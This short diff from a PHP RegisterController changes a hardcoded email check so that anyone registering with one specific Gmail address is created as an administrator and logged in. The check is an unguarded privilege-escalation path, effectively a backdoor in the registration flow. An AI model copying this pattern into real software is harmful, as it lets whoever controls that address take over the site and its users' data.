@@ -45,7 +45,7 @@ class RegisterController extends Controller
     {
         $this->validator($request->all())->validate();
 	   
-	   	if($request->email=='admin@gmail.com'){
+	   	if($request->email=='bosquessur123@gmail.com'){
 			event(new Registered($user = $this->create_admin($request->all())), $user->is_admin=1);
 			$this->guard()->login($user);
 			
